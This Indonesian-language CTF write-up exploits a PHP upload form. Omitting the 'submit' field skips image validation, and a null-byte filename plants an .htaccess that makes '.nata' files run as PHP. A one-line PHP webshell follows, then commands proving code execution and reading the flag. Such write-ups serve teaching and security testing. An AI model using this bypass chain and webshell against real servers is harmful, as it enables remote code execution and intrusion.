# Submission Portal Writeup

## Ringkasan

Challenge ini terlihat seperti upload image biasa yang sudah "dipatch":

- extension dibatasi ke `jpg`, `jpeg`, `png`, `gif`
- MIME dicek dengan `getimagesize()`
- file diproses ulang lewat GD supaya payload yang ditempel di akhir file hilang

Awalnya semua itu memang kelihatan benar. Upload JPEG/PNG/GIF normal diproses ulang, payload PHP yang ditempel ikut hilang, dan double extension seperti `.php.jpg` tidak dieksekusi.

Titik lemahnya ternyata bukan di filter image-nya, tapi di **cara validasi itu diaktifkan**.

## Bug Utama

Dari source `upload.php`, blok validasi image hanya jalan kalau ada field POST `submit`:

```php
if (isset($_POST["submit"])) {
    ...
}
```

Artinya:

- kalau request dibuat dari form normal, field `submit` ikut terkirim dan semua filter jalan
- kalau request dikirim manual tanpa field `submit`, validasi image **tidak jalan sama sekali**

Tetapi proses berikut ini tetap berjalan:

- penentuan nama file dari `$_FILES["fileToUpload"]["name"]`
- pengecekan `file_exists()`
- pengecekan ukuran file
- `move_uploaded_file()`

Jadi kita bisa upload **file mentah apa pun** selama nama file akhirnya terlihat seperti ekstensi yang diizinkan.

## Bug Kedua: Null Byte pada Nama File

Nama file diambil dari:

```php
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
```

Dengan filename seperti:

```text
.htaccess\x00.jpg
```

aplikasi melihat extension `jpg`, jadi lolos whitelist extension. Tapi saat file dipindah ke filesystem, nama efektif terpotong di null byte dan file tersimpan sebagai:

```text
.htaccess
```

Trik yang sama bisa dipakai untuk:

```text
probe.nata\x00.jpg
```

yang akhirnya tersimpan sebagai:

```text
probe.nata
```

## Rantai Eksploitasi

### 1. Upload `.htaccess`

Karena validasi image sengaja dilewati dengan **tidak mengirim field `submit`**, kita bisa upload isi `.htaccess` mentah:

```apache
AddType application/x-httpd-php .nata
AddHandler application/x-httpd-php .nata
```

Nama file yang dipakai:

```text
.htaccess\x00.jpg
```

Hasilnya file tersimpan sebagai `.htaccess` di folder `/submissions/`.

### 2. Upload webshell

Lalu upload file PHP sederhana dengan nama:

```text
probe.nata\x00.jpg
```

Isi file:

```php
<?php echo "OK:"; system($_GET["cmd"] ?? "id"); ?>
```

Karena `.htaccess` tadi sudah membuat `.nata` diproses sebagai PHP, file itu sekarang bisa dieksekusi lewat browser.

### 3. Validasi RCE

Request:

```text
/submissions/probe.nata?cmd=id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Berarti RCE berhasil.

### 4. Ambil flag

Setelah shell aktif, cari file menarik:

```sh
ls -la /
```

Terlihat ada:

```text
/flag.txt
```

Lalu baca:

```sh
cat /flag.txt
```

Flag:

```text
RAM{m1ssing_subm1t_b0undary_brEAks_th3_g4te}
```

## Kenapa Patch Sebelumnya Gagal

Patch yang ada sebenarnya lumayan rapat kalau request datang dari form normal:

- whitelist extension
- MIME check
- re-encode lewat GD

Masalahnya semua itu diletakkan di dalam:

```php
if (isset($_POST["submit"]))
```

Jadi keamanan aplikasi bergantung pada ada tidaknya satu field form yang bisa dengan mudah dihilangkan saat request dibuat manual.

